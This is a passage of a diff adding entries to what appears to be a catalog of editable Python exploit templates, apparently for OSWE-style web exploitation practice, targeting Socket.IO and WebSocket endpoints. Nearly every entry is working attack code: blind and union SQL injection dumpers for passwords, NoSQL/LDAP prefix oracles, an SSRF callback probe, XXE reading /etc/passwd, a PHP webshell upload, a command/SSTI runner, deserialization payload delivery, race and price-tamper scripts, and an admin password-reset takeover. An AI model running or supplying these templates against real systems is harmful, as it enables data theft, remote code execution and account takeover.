+    aliases:["socket.io union","socketio visible","42 dump","marker extract","reflected socket.io","json path socket.io"],
+    useWhen:"Socket.IO response visibly contains SQLi/output data or a JSON field with the wanted value.",
+    editFirst:["EVENT_NAME","PAYLOAD_TEMPLATE","PAYLOAD_FIELD","PAYLOAD","VALUE_MODE","VALUE_REGEX","JSON_PATH"],
+    dependsOn:["helper-socketio-transport"],
+    sourceRefs:["v4","socket.io"],
+    code:String.raw`def dump_socketio_visible_response():
+    WS_PATH_OR_URL = "/socket.io/"          # EDIT
+    EVENT_NAME = "search"                   # EDIT
+    EIO = 4                                 # EDIT
+    NAMESPACE = ""                          # EDIT
+    PAYLOAD_TEMPLATE = {                    # EDIT
+        "token": "__LOOT:socketio_auth_token__", # EDIT remove if no token-in-payload
+        "q": "__PAYLOAD__",
+    }
+    PAYLOAD_FIELD = "q"                     # EDIT
+    PAYLOAD = "test"                        # EDIT e.g. union payload with marker
+    VALUE_MODE = "regex"                    # EDIT: regex | json | raw
+    VALUE_REGEX = r"OSWE:(.*?):EWSO"        # EDIT
+    JSON_PATH = ("data",)                   # EDIT
+
+    msg = ws_message_set(PAYLOAD_TEMPLATE, PAYLOAD_FIELD, PAYLOAD)
+    raw = socketio_request(WS_PATH_OR_URL, EVENT_NAME, msg, namespace=NAMESPACE, eio=EIO)
+    data = socketio_json_data(raw)
+    if VALUE_MODE == "json":
+        value = json_get(data, JSON_PATH)
+    elif VALUE_MODE == "regex":
+        value = save_hit("socketio_visible", regex_hits(raw, VALUE_REGEX), resp=raw)
+        return value
+    else:
+        value = raw
+    return save_loot("socketio_visible", value, resp=raw)
+`
+  },
+  {
+    id:"socketio-time-oracle-dump",
+    title:"REPLACE dump() - Socket.IO time oracle extractor",
+    category:"SQLi / Oracle",
+    kind:"replace",
+    chainRole:"extract",
+    defaultFunction:"dump_socketio_time_oracle",
+    aliases:["socket.io time","socketio time","42 sleep","pg_sleep socket.io","waitfor socket.io","blind time"],
+    useWhen:"True predicates delay a Socket.IO event response. Same idea as HTTP time oracle, but over Socket.IO.",
+    editFirst:["EVENT_NAME","PAYLOAD_TEMPLATE","PAYLOAD_FIELD","INJECTION","DELAY_SECONDS","LENGTH_EXPR","CHAR_EXPR"],
+    dependsOn:["helper-socketio-transport"],
+    sourceRefs:["v4","socket.io"],
+    code:String.raw`def dump_socketio_time_oracle():
+    WS_PATH_OR_URL = "/socket.io/"          # EDIT
+    EVENT_NAME = "search"                   # EDIT
+    EIO = 4                                 # EDIT
+    NAMESPACE = ""                          # EDIT
+    PAYLOAD_TEMPLATE = {                    # EDIT
+        "token": "__LOOT:socketio_auth_token__", # EDIT remove if no token-in-payload
+        "q": "__PAYLOAD__",
+    }
+    PAYLOAD_FIELD = "q"                     # EDIT
+    DELAY_SECONDS = 4                       # EDIT
+    TRUE_SECONDS = 3                        # EDIT threshold
+    INJECTION = "x' OR CASE WHEN ({q}) THEN pg_sleep(4) ELSE pg_sleep(0) END-- -" # EDIT
+    LENGTH_EXPR = "length(password)={n}"    # EDIT
+    CHAR_EXPR = "ascii(substr(password,{i},1)) BETWEEN {lo} AND {mid}" # EDIT
+    MAX_LEN = 80                            # EDIT
+
+    def oracle(q):
+        msg = ws_message_set(PAYLOAD_TEMPLATE, PAYLOAD_FIELD, INJECTION.format(q=q))
+        start = time.time()
+        socketio_request(WS_PATH_OR_URL, EVENT_NAME, msg, namespace=NAMESPACE, eio=EIO, timeout=TIMEOUT + DELAY_SECONDS)
+        elapsed = time.time() - start
+        dprint("[socket.io time]", q, elapsed)
+        return elapsed >= TRUE_SECONDS
+
+    length = next((n for n in range(1, MAX_LEN + 1) if oracle(LENGTH_EXPR.format(n=n))), 0)
+    check(length, "length not found")
+    out = ""
+    for i in range(1, length + 1):
+        lo, hi = 32, 126
+        while lo <= hi:
+            mid = (lo + hi) // 2
+            if oracle(CHAR_EXPR.format(i=i, lo=lo, mid=mid)):
+                hi = mid - 1
+            else:
+                lo = mid + 1
+        out += chr(lo)
+        print("[partial]", out)
+    return save_loot("socketio_time_dump", out)
+`
+  },
+  {
+    id:"socketio-prefix-oracle-dump",
+    title:"REPLACE dump() - Socket.IO prefix oracle extractor",
+    category:"NoSQL / LDAP / XPath",
+    kind:"replace",
+    chainRole:"extract",
+    defaultFunction:"dump_socketio_prefix_oracle",
+    aliases:["socket.io prefix","socketio nosql","42 regex","ldap socket.io","xpath socket.io","starts with"],
+    useWhen:"Socket.IO search/login/filter returns true when guessed prefix matches. Useful for NoSQL regex, LDAP, XPath-style blind extraction.",
+    editFirst:["EVENT_NAME","PAYLOAD_TEMPLATE","PAYLOAD_FIELD","PREFIX_TEMPLATE","TRUE_MARKER","ALPHABET"],
+    dependsOn:["helper-socketio-transport"],
+    sourceRefs:["v4","socket.io"],
+    code:String.raw`def dump_socketio_prefix_oracle():
+    WS_PATH_OR_URL = "/socket.io/"          # EDIT
+    EVENT_NAME = "search"                   # EDIT
+    EIO = 4                                 # EDIT
+    NAMESPACE = ""                          # EDIT
+    PAYLOAD_TEMPLATE = {                    # EDIT
+        "token": "__LOOT:socketio_auth_token__", # EDIT remove if no token-in-payload
+        "username": "__PAYLOAD__",
+    }
+    PAYLOAD_FIELD = "username"              # EDIT
+    PREFIX_TEMPLATE = "admin{guess}*"       # EDIT syntax: regex/LDAP/XPath/etc.
+    TRUE_MARKER = "found"                   # EDIT
+    ALPHABET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_-.@"
+    MAX_LEN = 80                            # EDIT
+
+    out = ""
+    for _ in range(MAX_LEN):
+        found = False
+        for ch in ALPHABET:
+            guess = out + ch
+            msg = ws_message_set(PAYLOAD_TEMPLATE, PAYLOAD_FIELD, PREFIX_TEMPLATE.format(guess=guess))
+            raw = socketio_request(WS_PATH_OR_URL, EVENT_NAME, msg, namespace=NAMESPACE, eio=EIO)
+            if TRUE_MARKER in raw:
+                out = guess
+                found = True
+                print("[partial]", out)
+                break
+        if not found:
+            break
+    return save_loot("socketio_prefix_dump", out)
+`
+  },
+  {
+    id:"socketio-ssrf-oob-probe",
+    title:"REPLACE exploit() - Socket.IO SSRF/OOB probe",
+    category:"SSRF / OOB",
+    kind:"replace",
+    chainRole:"exploit",
+    defaultFunction:"socketio_ssrf_oob_probe",
+    aliases:["socket.io ssrf","socketio oob","42 url","internal fetch socket.io","callback socket.io"],
+    useWhen:"The server-side URL/fetch field is inside a Socket.IO event.",
+    editFirst:["EVENT_NAME","PAYLOAD_TEMPLATE","URL_FIELD","CALLBACK_PATH","SUCCESS_MARKER"],
+    dependsOn:["helper-socketio-transport"],
+    sourceRefs:["v4","socket.io"],
+    code:String.raw`def socketio_ssrf_oob_probe():
+    require_callback()
+    WS_PATH_OR_URL = "/socket.io/"          # EDIT
+    EVENT_NAME = "fetchUrl"                 # EDIT
+    EIO = 4                                 # EDIT
+    NAMESPACE = ""                          # EDIT
+    PAYLOAD_TEMPLATE = {                    # EDIT
+        "token": "__LOOT:socketio_auth_token__", # EDIT remove if no token-in-payload
+        "url": "__URL__",
+    }
+    URL_FIELD = "url"                       # EDIT
+    CALLBACK_PATH = "ssrf"                  # EDIT
+    SUCCESS_MARKER = ""                     # EDIT optional
+
+    cb = callback_url(CALLBACK_PATH)
+    msg = ws_message_set(PAYLOAD_TEMPLATE, URL_FIELD, cb)
+    raw = socketio_request(WS_PATH_OR_URL, EVENT_NAME, msg, namespace=NAMESPACE, eio=EIO)
+    print("[socket.io ssrf]", raw[:500])
+    if SUCCESS_MARKER:
+        check(SUCCESS_MARKER in raw, "Socket.IO SSRF marker missing")
+    return raw
+`
+  },
+  {
+    id:"socketio-xxe-inline-file-read",
+    title:"REPLACE exploit() - Socket.IO XXE inline file read",
+    category:"SSRF / OOB",
+    kind:"replace",
+    chainRole:"exploit",
+    defaultFunction:"socketio_xxe_inline_file_read",
+    aliases:["socket.io xxe","socketio xml","42 xml","doctype socket.io","file entity socket.io"],
+    useWhen:"Socket.IO event carries XML string/body and you need inline XXE file read.",
+    editFirst:["EVENT_NAME","PAYLOAD_TEMPLATE","XML_FIELD","BODY_TEMPLATE","FILE_PATH"],
+    dependsOn:["helper-socketio-transport","helper-xxe-response-extractor"],
+    sourceRefs:["v4","socket.io"],
+    code:String.raw`def socketio_xxe_inline_file_read():
+    WS_PATH_OR_URL = "/socket.io/"          # EDIT
+    EVENT_NAME = "importXml"                # EDIT
+    EIO = 4                                 # EDIT
+    NAMESPACE = ""                          # EDIT
+    FILE_PATH = "/etc/passwd"               # EDIT
+    XML_FIELD = "xml"                       # EDIT
+    PAYLOAD_TEMPLATE = {                    # EDIT
+        "token": "__LOOT:socketio_auth_token__", # EDIT remove if no token-in-payload
+        "xml": "__XML__",
+    }
+    BODY_TEMPLATE = "<root><name>__ENTITY__</name></root>" # EDIT paste Burp XML body
+    ENTITY_NAME = "xxe"                     # EDIT
+
+    doctype = f'<!DOCTYPE data [<!ENTITY {ENTITY_NAME} SYSTEM "file://{FILE_PATH}">]>'
+    xml = '<?xml version="1.0"?>\n' + doctype + "\n" + BODY_TEMPLATE.replace("__ENTITY__", f"&{ENTITY_NAME};")
+    msg = ws_message_set(PAYLOAD_TEMPLATE, XML_FIELD, xml)
+    raw = socketio_request(WS_PATH_OR_URL, EVENT_NAME, msg, namespace=NAMESPACE, eio=EIO)
+    print("[socket.io xxe]", raw[:1000])
+    save_xxe_response(raw, label="socketio_xxe")
+    return raw
+`
+  },
+  {
+    id:"socketio-upload-webshell",
+    title:"REPLACE exploit() - Socket.IO upload webshell",
+    category:"Upload / Webshell",
+    kind:"replace",
+    chainRole:"exploit",
+    defaultFunction:"upload_webshell_socketio",
+    aliases:["socket.io upload","socketio webshell","42 upload","base64 upload socket.io","file upload socket.io"],
+    useWhen:"File upload is done by Socket.IO event, often filename/content/base64 fields.",
+    editFirst:["EVENT_NAME","PAYLOAD_TEMPLATE","FILENAME_FIELD","CONTENT_FIELD","WEBSHELL_CODE"],
+    dependsOn:["helper-socketio-transport"],
+    sourceRefs:["v4","socket.io"],
+    code:String.raw`def upload_webshell_socketio():
+    WS_PATH_OR_URL = "/socket.io/"          # EDIT
+    EVENT_NAME = "upload"                   # EDIT
+    EIO = 4                                 # EDIT
+    NAMESPACE = ""                          # EDIT
+    FILENAME = "shell.php"                  # EDIT
+    WEBSHELL_CODE = "<?php system($_GET['cmd'] ?? 'id'); ?>" # EDIT
+    ENCODING = "base64"                     # EDIT: raw | base64
+    PAYLOAD_TEMPLATE = {                    # EDIT
+        "token": "__LOOT:socketio_auth_token__", # EDIT remove if no token-in-payload
+        "name": "__NAME__",
+        "content": "__CONTENT__",
+    }
+    FILENAME_FIELD = "name"                 # EDIT
+    CONTENT_FIELD = "content"               # EDIT
+    SUCCESS_MARKER = ""                     # EDIT optional
+
+    content = base64.b64encode(WEBSHELL_CODE.encode()).decode() if ENCODING == "base64" else WEBSHELL_CODE
+    msg = ws_message_set(PAYLOAD_TEMPLATE, FILENAME_FIELD, FILENAME)
+    msg = ws_message_set(msg, CONTENT_FIELD, content)
+    raw = socketio_request(WS_PATH_OR_URL, EVENT_NAME, msg, namespace=NAMESPACE, eio=EIO)
+    print("[socket.io upload]", raw[:500])
+    if SUCCESS_MARKER:
+        check(SUCCESS_MARKER in raw, "Socket.IO upload marker missing")
+    return raw
+`
+  },
+  {
+    id:"socketio-generic-run-cmd",
+    title:"REPLACE run_cmd() - Generic Socket.IO command/SSTI",
+    category:"Command / SSTI",
+    kind:"replace",
+    chainRole:"cmd",
+    defaultFunction:"run_cmd_socketio",
+    aliases:["socket.io rce","socketio command","42 command","socket.io ssti","command injection socket.io"],
+    useWhen:"Command/SSTI/eval payload is delivered as a Socket.IO event field.",
+    editFirst:["EVENT_NAME","PAYLOAD_TEMPLATE","CMD_FIELD","WRAP_CMD","OUTPUT_REGEX"],
+    dependsOn:["helper-socketio-transport"],
+    sourceRefs:["v4","socket.io"],
+    code:String.raw`def run_cmd_socketio(cmd):
+    WS_PATH_OR_URL = "/socket.io/"          # EDIT
+    EVENT_NAME = "run"                      # EDIT
+    EIO = 4                                 # EDIT
+    NAMESPACE = ""                          # EDIT
+    PAYLOAD_TEMPLATE = {                    # EDIT
+        "token": "__LOOT:socketio_auth_token__", # EDIT remove if no token-in-payload
+        "cmd": "__CMD__",
+    }
+    CMD_FIELD = "cmd"                       # EDIT
+    WRAP_CMD = "{cmd}"                      # EDIT e.g. ";{cmd};" or "{{config.__class__...}}"
+    OUTPUT_REGEX = ""                       # EDIT optional capture
+
+    msg = ws_message_set(PAYLOAD_TEMPLATE, CMD_FIELD, WRAP_CMD.format(cmd=cmd))
+    raw = socketio_request(WS_PATH_OR_URL, EVENT_NAME, msg, namespace=NAMESPACE, eio=EIO)
+    print("[socket.io cmd]", raw[:1000])
+    if OUTPUT_REGEX:
+        hits = regex_hits(raw, OUTPUT_REGEX)
+        return hits[0] if hits else ""
+    return raw
+`
+  },
+  {
+    id:"socketio-deser-delivery",
+    title:"REPLACE exploit() - Socket.IO deserialization delivery",
+    category:"Deserialization",
+    kind:"replace",
+    chainRole:"exploit",
+    defaultFunction:"deliver_socketio_deser_payload",
+    aliases:["socket.io deser","socketio deserialization","42 serialized","pickle socket.io","ysoserial socket.io","phpggc socket.io"],
+    useWhen:"Serialized payload is sent inside a Socket.IO event field.",
+    editFirst:["EVENT_NAME","PAYLOAD_TEMPLATE","PAYLOAD_FIELD","PAYLOAD_FILE","ENCODING"],
+    dependsOn:["helper-socketio-transport"],
+    sourceRefs:["v4","socket.io"],
+    code:String.raw`def deliver_socketio_deser_payload():
+    WS_PATH_OR_URL = "/socket.io/"          # EDIT
+    EVENT_NAME = "deserialize"              # EDIT
+    EIO = 4                                 # EDIT
+    NAMESPACE = ""                          # EDIT
+    PAYLOAD_TEMPLATE = {                    # EDIT
+        "token": "__LOOT:socketio_auth_token__", # EDIT remove if no token-in-payload
+        "blob": "__PAYLOAD__",
+    }
+    PAYLOAD_FIELD = "blob"                  # EDIT
+    PAYLOAD_FILE = "payload.bin"            # EDIT generated by ysoserial/phpggc/custom builder
+    ENCODING = "base64"                     # EDIT: raw | base64 | hex
+    SUCCESS_MARKER = ""                     # EDIT optional
+
+    data = open(PAYLOAD_FILE, "rb").read()
+    if ENCODING == "base64":
+        value = base64.b64encode(data).decode()
+    elif ENCODING == "hex":
+        value = data.hex()
+    else:
+        value = data.decode(errors="ignore")
+    msg = ws_message_set(PAYLOAD_TEMPLATE, PAYLOAD_FIELD, value)
+    raw = socketio_request(WS_PATH_OR_URL, EVENT_NAME, msg, namespace=NAMESPACE, eio=EIO)
+    print("[socket.io deser]", raw[:500])
+    if SUCCESS_MARKER:
+        check(SUCCESS_MARKER in raw, "Socket.IO deser marker missing")
+    return raw
+`
+  },
+  {
+    id:"socketio-second-order-trigger",
+    title:"REPLACE exploit() - Socket.IO second-order trigger",
+    category:"Logic / Race",
+    kind:"replace",
+    chainRole:"exploit",
+    defaultFunction:"socketio_second_order_trigger",
+    aliases:["socket.io second order","socketio stored trigger","42 store trigger","bot socket.io","delayed socket.io"],
+    useWhen:"One Socket.IO event stores payload/state and a second Socket.IO event triggers processing later.",
+    editFirst:["STORE_EVENT","TRIGGER_EVENT","STORE_PAYLOAD","TRIGGER_PAYLOAD","SUCCESS_MARKER"],
+    dependsOn:["helper-socketio-transport"],
+    sourceRefs:["v4","socket.io"],
+    code:String.raw`def socketio_second_order_trigger():
+    WS_PATH_OR_URL = "/socket.io/"          # EDIT
+    EIO = 4                                 # EDIT
+    NAMESPACE = ""                          # EDIT
+    STORE_EVENT = "save"                    # EDIT
+    TRIGGER_EVENT = "process"               # EDIT
+    STORE_PAYLOAD = {"value": "PAYLOAD"}    # EDIT
+    TRIGGER_PAYLOAD = {}                    # EDIT
+    SUCCESS_MARKER = ""                     # EDIT optional
+
+    socketio_request(WS_PATH_OR_URL, STORE_EVENT, STORE_PAYLOAD, namespace=NAMESPACE, eio=EIO)
+    raw = socketio_request(WS_PATH_OR_URL, TRIGGER_EVENT, TRIGGER_PAYLOAD, namespace=NAMESPACE, eio=EIO)
+    print("[socket.io second-order]", raw[:1000])
+    if SUCCESS_MARKER:
+        check(SUCCESS_MARKER in raw, "Socket.IO second-order marker missing")
+    return raw
+`
+  },
+  {
+    id:"socketio-race-burst",
+    title:"REPLACE exploit() - Socket.IO race burst helper",
+    category:"Logic / Race",
+    kind:"replace",
+    chainRole:"exploit",
+    defaultFunction:"socketio_race_burst",
+    aliases:["socket.io race","socketio burst","42 race","concurrent socket.io","double spend socket.io"],
+    useWhen:"Race bug requires sending the same Socket.IO state-changing event many times concurrently.",
+    editFirst:["EVENT_NAME","PAYLOAD","THREADS","SUCCESS_MARKER"],
+    dependsOn:["helper-socketio-transport"],
+    sourceRefs:["v4","socket.io"],
+    code:String.raw`def socketio_race_burst():
+    import concurrent.futures
+    WS_PATH_OR_URL = "/socket.io/"          # EDIT
+    EVENT_NAME = "claim"                    # EDIT
+    EIO = 4                                 # EDIT
+    NAMESPACE = ""                          # EDIT
+    PAYLOAD = {"amount": 1}                 # EDIT
+    THREADS = 20                            # EDIT
+    SUCCESS_MARKER = ""                     # EDIT optional
+
+    def one(_):
+        return socketio_request(WS_PATH_OR_URL, EVENT_NAME, PAYLOAD, namespace=NAMESPACE, eio=EIO)
+
+    with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as ex:
+        replies = list(ex.map(one, range(THREADS)))
+    hits = [r for r in replies if (not SUCCESS_MARKER) or SUCCESS_MARKER in r]
+    print("[socket.io race hits]", len(hits), "of", len(replies))
+    return hits
+`
+  },
+  {
+    id:"socketio-logic-tamper",
+    title:"REPLACE exploit() - Socket.IO logic/amount tamper",
+    category:"Logic / Race",
+    kind:"replace",
+    chainRole:"exploit",
+    defaultFunction:"socketio_logic_tamper",
+    aliases:["socket.io logic","socketio amount","42 tamper","negative amount socket.io","price socket.io"],
+    useWhen:"Business logic flaw is triggered by changing numeric/role/state fields in a Socket.IO event.",
+    editFirst:["EVENT_NAME","PAYLOAD_TEMPLATE","FIELD_PATH","CANDIDATES","SUCCESS_MARKER"],
+    dependsOn:["helper-socketio-transport"],
+    sourceRefs:["v4","socket.io"],
+    code:String.raw`def socketio_logic_tamper():
+    WS_PATH_OR_URL = "/socket.io/"          # EDIT
+    EVENT_NAME = "purchase"                 # EDIT
+    EIO = 4                                 # EDIT
+    NAMESPACE = ""                          # EDIT
+    PAYLOAD_TEMPLATE = {                    # EDIT exact event data
+        "token": "__LOOT:socketio_auth_token__", # EDIT remove if no token-in-payload
+        "amount": 1,
+    }
+    FIELD_PATH = "amount"                   # EDIT dotted path/list index supported
+    CANDIDATES = [-1, 0, 1, 999999999, -999999999] # EDIT
+    SUCCESS_MARKER = "success"              # EDIT
+
+    hits = []
+    for value in CANDIDATES:
+        msg = ws_message_set(PAYLOAD_TEMPLATE, FIELD_PATH, value)
+        raw = socketio_request(WS_PATH_OR_URL, EVENT_NAME, msg, namespace=NAMESPACE, eio=EIO)
+        print("[socket.io logic]", value, raw[:200])
+        if SUCCESS_MARKER in raw:
+            hits.append((value, raw))
+    check(hits, "no Socket.IO logic value worked")
+    return hits[0]
 `
   },
   {
@@ -1666,6 +2769,45 @@ if (input.operation === "decrypt") {
 `
   },
   {
+    id:"token-reset-websocket-flow",
+    title:"REPLACE step - WebSocket reset token takeover",
+    category:"Tokens",
+    kind:"replace",
+    chainRole:"token",
+    defaultFunction:"reset_token_takeover_ws",
+    aliases:["websocket reset password","ws reset token","token leak","admin takeover","password reset"],
+    useWhen:"Password reset/token workflow is driven by WebSocket messages rather than HTTP requests.",
+    editFirst:["WS_PATH_OR_URL","REQUEST_MESSAGE","READ_TOKEN_MESSAGE","RESET_MESSAGE","TOKEN_REGEX","ADMIN_USER"],
+    dependsOn:["helper-websocket-transport"],
+    sourceRefs:["v4"],
+    code:String.raw`def reset_token_takeover_ws():
+    WS_PATH_OR_URL = "/ws/reset"              # EDIT
+    ORIGIN = None                             # EDIT
+    HEADERS = {}                              # EDIT
+    COOKIES = {}                              # EDIT
+    SESSION_COOKIES = True                    # EDIT
+    ADMIN_USER = "admin"                      # EDIT
+    NEW_PASS = "Password123!"                 # EDIT
+    REQUEST_MESSAGE = {"action": "forgot", "user": "__USER__"}  # EDIT
+    READ_TOKEN_MESSAGE = {"action": "debug_mail"}               # EDIT
+    RESET_MESSAGE = {"action": "reset", "token": "__TOKEN__", "password": "__PASS__", "confirm": "__PASS__"}  # EDIT
+    TOKEN_REGEX = r"token=([A-Za-z0-9._-]+)"  # EDIT
+    SUCCESS_MARKER = "ok"                     # EDIT
+
+    req = json.loads(json.dumps(REQUEST_MESSAGE).replace("__USER__", ADMIN_USER))
+    ws_request(WS_PATH_OR_URL, req, headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES, origin=ORIGIN)
+    raw = ws_request(WS_PATH_OR_URL, READ_TOKEN_MESSAGE, headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES, origin=ORIGIN)
+    m = re.search(TOKEN_REGEX, raw, re.S)
+    check(m, "reset token not found in WebSocket response")
+
+    reset_raw = json.dumps(RESET_MESSAGE).replace("__TOKEN__", m.group(1)).replace("__PASS__", NEW_PASS)
+    reply = ws_request(WS_PATH_OR_URL, reset_raw, headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES, origin=ORIGIN, send_json=False)
+    check(SUCCESS_MARKER in reply, "websocket password reset failed")
+    print("[+] websocket admin password reset")
+    return NEW_PASS
+`
+  },
+  {
     id:"boolean-oracle-dump",
     title:"REPLACE dump() - Boolean oracle extractor",
     category:"SQLi / Oracle",
@@ -1729,6 +2871,249 @@ if (input.operation === "decrypt") {
             die("bad STRATEGY")
         print("[dump]", out)
     check(out, "boolean oracle dumped nothing")
+    return out
+`
+  },
+  {
+    id:"websocket-boolean-oracle-dump",
+    title:"REPLACE dump() - WebSocket boolean oracle extractor",
+    category:"SQLi / Oracle",
+    kind:"replace",
+    chainRole:"extract",
+    defaultFunction:"dump_ws_boolean_oracle",
+    aliases:["websocket","ws","ws boolean","sqli","boolean","blind","dump","oracle","binary search","bisection","LEN","SUBSTRING","ASCII","taken","check username"],
+    useWhen:"Boolean SQLi oracle is exposed through a WebSocket message/response instead of a normal HTTP request.",
+    editFirst:["WS_PATH_OR_URL","MESSAGE_TEMPLATE","INJECT_FIELD","TRUE_TEST","QUERY","MAX_LEN","LEN_CONDITION","CHAR_EXPR"],
+    dependsOn:[],
+    sourceRefs:["user snippet","v4"],
+    dependsOn:["helper-websocket-transport"],
+    code:String.raw`def dump_ws_boolean_oracle():
+    WS_PATH_OR_URL = "/ws/check-username"       # EDIT or full ws:// / wss:// URL
+    ORIGIN = None                               # EDIT: url("/") if server checks Origin
+    HEADERS = {}                                # EDIT e.g. {"Authorization": "Bearer REPLACE"}
+    COOKIES = {}                                # EDIT exact cookies to add to Cookie header
+    SESSION_COOKIES = True                      # EDIT include current s.cookies in Cookie header
+    MESSAGE_TEMPLATE = {"u": "__PAYLOAD__"}     # EDIT exact Burp WebSocket JSON shape
+    INJECT_FIELD = "u"                          # EDIT field receiving the payload
+    TARGET_VALUE = "maria"                      # EDIT known username/prefix before injection
+    INJECTION_TEMPLATE = "{value}' AND ({cond})-- -"  # EDIT SQL syntax
+    TRUE_TEST = "json_status_taken"             # EDIT: json_status_taken / marker / status_bool
+    TRUE_MARKER = "taken"                       # EDIT used when TRUE_TEST="marker"
+    QUERY = "password"                          # EDIT scalar SQL expression/column in current query scope
+    MAX_LEN = 80                                # EDIT
+    ASCII_MIN = 32                              # EDIT
+    ASCII_MAX = 126                             # EDIT
+    LEN_CONDITION = "LEN({query})={n}"           # EDIT MySQL: LENGTH(({query}))={n}
+    CHAR_EXPR = "ASCII(SUBSTRING({query},{pos},1))"  # EDIT MySQL: ASCII(SUBSTRING(({query}),{pos},1))
+
+    def build_message(payload):
+        msg = json.loads(json.dumps(MESSAGE_TEMPLATE))
+        msg[INJECT_FIELD] = payload
+        return msg
+
+    def response_is_true(raw):
+        if TRUE_TEST == "marker":
+            return TRUE_MARKER in raw
+        try:
+            data = json.loads(raw)
+        except json.JSONDecodeError:
+            return False
+        if TRUE_TEST == "json_status_taken":
+            return data.get("status") == "taken"
+        if TRUE_TEST == "status_bool":
+            return bool(data.get("status"))
+        die("bad TRUE_TEST")
+
+    def oracle(condition):
+        payload = INJECTION_TEMPLATE.format(value=TARGET_VALUE, cond=condition)
+        raw = ws_request(WS_PATH_OR_URL, build_message(payload), headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES, origin=ORIGIN)
+        dprint("[ws]", raw)
+        return response_is_true(raw)
+
+    length = None
+    for n in range(0, MAX_LEN + 1):
+        if oracle(LEN_CONDITION.format(query=QUERY, n=n)):
+            length = n
+            break
+    check(length is not None, "length not found; check TRUE_TEST, query syntax, or MAX_LEN")
+    print("[*] length:", length)
+
+    out = ""
+    for pos in range(1, length + 1):
+        expr = CHAR_EXPR.format(query=QUERY, pos=pos)
+        lo, hi = ASCII_MIN, ASCII_MAX
+        while lo <= hi:
+            mid = (lo + hi) // 2
+            if oracle(f"{expr} BETWEEN {lo} AND {mid}"):
+                hi = mid - 1
+            else:
+                lo = mid + 1
+        out += chr(lo)
+        print("[dump]", out)
+    check(out, "websocket boolean oracle dumped nothing")
+    return out
+`
+  },
+  {
+    id:"websocket-visible-response-dump",
+    title:"REPLACE dump() - WebSocket visible response extractor",
+    category:"SQLi / Oracle",
+    kind:"replace",
+    chainRole:"extract",
+    defaultFunction:"dump_ws_visible_response",
+    aliases:["websocket","ws visible","ws union","union","marker","regex extract","json path","reflected websocket","dump"],
+    useWhen:"The WebSocket response reflects SQLi/output data, or a WS message returns JSON containing the value you need.",
+    editFirst:["WS_PATH_OR_URL","MESSAGE_TEMPLATE","INJECT_FIELD","PAYLOAD","VALUE_MODE","MARKER","VALUE_REGEX","JSON_PATH"],
+    dependsOn:["helper-websocket-transport"],
+    sourceRefs:["v4"],
+    code:String.raw`def dump_ws_visible_response():
+    WS_PATH_OR_URL = "/ws/search"              # EDIT or full ws:// / wss:// URL
+    ORIGIN = None                              # EDIT: url("/") if server checks Origin
+    HEADERS = {}                               # EDIT
+    COOKIES = {}                               # EDIT
+    SESSION_COOKIES = True                     # EDIT
+    MESSAGE_TEMPLATE = {"q": "__PAYLOAD__"}    # EDIT exact Burp WebSocket JSON shape
+    INJECT_FIELD = "q"                         # EDIT supports dotted path, e.g. "data.query"
+    PAYLOAD = "' UNION SELECT 'OSWE:'||password||':EWSO' FROM users-- -"  # EDIT
+    VALUE_MODE = "marker"                      # EDIT: marker | regex | json | raw
+    MARKER_LEFT = "OSWE:"                      # EDIT
+    MARKER_RIGHT = ":EWSO"                     # EDIT
+    VALUE_REGEX = r"OSWE:(.*?):EWSO"           # EDIT
+    JSON_PATH = ("data", "value")              # EDIT for VALUE_MODE=json
+
+    msg = ws_message_set(MESSAGE_TEMPLATE, INJECT_FIELD, PAYLOAD)
+    raw = ws_request(WS_PATH_OR_URL, msg, headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES, origin=ORIGIN)
+    dprint("[ws]", raw)
+
+    if VALUE_MODE == "raw":
+        value = raw
+    elif VALUE_MODE == "marker":
+        start = raw.find(MARKER_LEFT)
+        check(start != -1, "left marker missing")
+        start += len(MARKER_LEFT)
+        end = raw.find(MARKER_RIGHT, start)
+        check(end != -1, "right marker missing")
+        value = raw[start:end]
+    elif VALUE_MODE == "regex":
+        m = re.search(VALUE_REGEX, raw, re.S)
+        check(m, "regex value not found")
+        value = m.group(1)
+    elif VALUE_MODE == "json":
+        value = json_get(json.loads(raw), JSON_PATH)
+        check(value is not None, "json value not found")
+    else:
+        die("bad VALUE_MODE")
+    print("[dump]", value)
+    return value
+`
+  },
+  {
+    id:"websocket-time-oracle-dump",
+    title:"REPLACE dump() - WebSocket time oracle extractor",
+    category:"SQLi / Oracle",
+    kind:"replace",
+    chainRole:"extract",
+    defaultFunction:"dump_ws_time_oracle",
+    aliases:["websocket","ws time","time oracle","blind","sleep","waitfor","pg_sleep","SLEEP","benchmark","dump"],
+    useWhen:"A WebSocket message reaches a blind SQLi/command sink where true conditions delay the WS response.",
+    editFirst:["WS_PATH_OR_URL","MESSAGE_TEMPLATE","INJECT_FIELD","SLEEP_SECONDS","THRESHOLD","QUERY","PAYLOAD_TEMPLATE"],
+    dependsOn:["helper-websocket-transport"],
+    sourceRefs:["v4"],
+    code:String.raw`def dump_ws_time_oracle():
+    WS_PATH_OR_URL = "/ws/search"              # EDIT or full ws:// / wss:// URL
+    ORIGIN = None                              # EDIT
+    HEADERS = {}                               # EDIT
+    COOKIES = {}                               # EDIT
+    SESSION_COOKIES = True                     # EDIT
+    MESSAGE_TEMPLATE = {"q": "__PAYLOAD__"}    # EDIT exact Burp WebSocket JSON shape
+    INJECT_FIELD = "q"                         # EDIT supports dotted path, e.g. "data.query"
+    SLEEP_SECONDS = 3                          # EDIT
+    THRESHOLD = 2.0                            # EDIT after baseline
+    QUERY = "select database()"                # EDIT scalar SQL expression
+    MAX_LEN = 80                               # EDIT
+    CHARSET = "abcdefghijklmnopqrstuvwxyz0123456789_-.@{}"  # EDIT
+    PAYLOAD_TEMPLATE = "' OR IF(({cond}),SLEEP(3),0)-- -"    # EDIT DB syntax; keep {cond}
+    LEN_CONDITION = "LENGTH(({query}))>={pos}"               # EDIT
+    CHAR_CONDITION = "ASCII(SUBSTRING(({query}),{pos},1))={ord_ch}"  # EDIT
+
+    def oracle(condition):
+        payload = PAYLOAD_TEMPLATE.format(cond=condition)
+        msg = ws_message_set(MESSAGE_TEMPLATE, INJECT_FIELD, payload)
+        start = time.time()
